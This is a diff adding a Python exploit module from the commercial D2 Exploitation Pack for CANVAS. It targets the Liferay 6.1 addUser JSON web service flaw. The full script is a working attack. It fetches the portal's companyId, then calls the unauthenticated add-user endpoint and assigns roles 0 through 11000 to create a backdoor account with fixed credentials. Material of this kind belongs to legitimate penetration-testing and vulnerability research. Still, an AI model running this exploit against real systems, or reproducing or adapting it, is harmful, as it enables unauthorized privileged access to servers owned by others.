@@ -1,0 +1,142 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import StringIO, urllib
+
+NAME = "d2sec_liferay_adduser"
+VERSION = "0.1"
+DESCRIPTION = "Liferay 6.1 addUser method Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "6.1"
+DOCUMENTATION["Date public"] = "2012/04/19"
+DOCUMENTATION["References"] = "http://marc.info/?l=bugtraq&m=133494739220008&w=2"
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port =  8080
+    self.name = NAME
+	
+  def run(self):
+    self.host = self.target.interface
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, 'http://%s:%d/api/jsonws/company/get-company-by-virtual-host'%(self.host, self.port))
+      c.setopt(pycurl.POSTFIELDS, urllib.urlencode({"virtualHost":"localhost"}))
+      c.setopt(pycurl.POST, 1)
+      c.setopt(pycurl.FOLLOWLOCATION, 1)
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(pycurl.WRITEFUNCTION, content.write)
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return ''
+    data = content.getvalue()
+    content.close()
+    try:
+      import simplejson
+      companyid = simplejson.loads(data)['companyId']
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return ''
+    self.log('[D2] companyid: %d' % companyid)
+    roles = ''
+    i = 0
+    while i < 10999:
+      roles += '%d,'%i
+      i += 1
+    roles += '11000'
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, 'http://%s:%d/api/jsonws/user/add-user'%(self.host, self.port))
+      datapost = {
+        "companyId": companyid,
+        "autoPassword": "false",
+        "password1": "d2sec",
+        "password2": "d2sec",
+        "autoScreenName": "false",
+        "screenName": "info",
+        "emailAddress": "info@d2sec.com",
+        "facebookId": "0",
+        "openId": "",
+        "locale": "en_US",
+        "firstName": "d2sec",
+        "middleName": "d",
+        "lastName": "d2sec",
+        "prefixId": "0",
+        "suffixId": "0",
+        "male": "true",
+        "birthdayMonth": "2",
+        "birthdayDay": "29",
+        "birthdayYear": "1980",
+        "jobTitle": "",
+        "groupIds": "",
+        "organizationIds": "",
+        "roleIds": roles,
+        "userGroupIds": "",
+        "sendEmail": "false",
+      }
+      c.setopt(pycurl.POSTFIELDS, urllib.urlencode(datapost))
+      c.setopt(pycurl.POST, 1)
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(pycurl.WRITEFUNCTION, content.write)
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return ''
+    data = content.getvalue()
+    content.close()
+    try:
+      import simplejson
+      data = simplejson.loads(data)
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return ''
+    if 'greeting' in data:
+      self.log('[D2] user info@d2sec.com with password d2sec created')
+      for index,value in data.items():
+        self.log('%s : %s' % (index,value))
+    else:
+      self.setInfo('[D2] %s attacking %s - failed' % (NAME, self.host))
+      return 0
+    self.setInfo('[D2] %s attacking %s - done' % (NAME, self.host))
+    return 1
+
+  def usage(self):
+    print 'Usage: %s -t target' % sys.argv[0]
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
